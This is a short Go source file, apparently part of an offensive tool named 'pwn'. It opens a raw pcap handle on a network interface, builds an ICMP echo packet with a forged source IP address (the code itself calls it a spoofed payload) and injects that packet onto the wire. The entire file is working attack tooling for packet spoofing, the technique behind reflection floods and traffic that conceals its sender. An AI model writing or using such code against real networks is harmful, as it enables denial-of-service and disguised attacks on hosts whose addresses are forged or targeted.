package main

import (
	"net"

	"github.com/adrianosela/pwn/payloads"
	"github.com/google/gopacket/pcap"
	"github.com/pkg/errors"
)

type pwner struct {
	wire    *pcap.Handle
	payload []byte
}

func newPwner(sIP, dIP net.IP, iface string, gwMAC net.HardwareAddr) (*pwner, error) {
	wire, err := pcap.OpenLive(iface, 1024, false, pcap.BlockForever)
	if err != nil {
		return nil, errors.Wrap(err, "could not open live")
	}
	nif, err := net.InterfaceByName(iface)
	if err != nil {
		return nil, errors.Wrap(err, "could not get outbound interface")
	}
	payload, err := payloads.Build(payloads.TypeICMPEcho, payloads.Config{
		SrcIP:  sIP,
		DstIP:  dIP,
		SrcMAC: nif.HardwareAddr,
		DstMAC: gwMAC,
	})
	if err != nil {
		return nil, errors.Wrap(err, "could not build a spoofed payload")
	}
	return &pwner{
		wire:    wire,
		payload: payload,
	}, nil
}

func (p *pwner) execute() error {
	return p.wire.WritePacketData(p.payload)
}

func (p *pwner) close() {
	p.wire.Close()
}
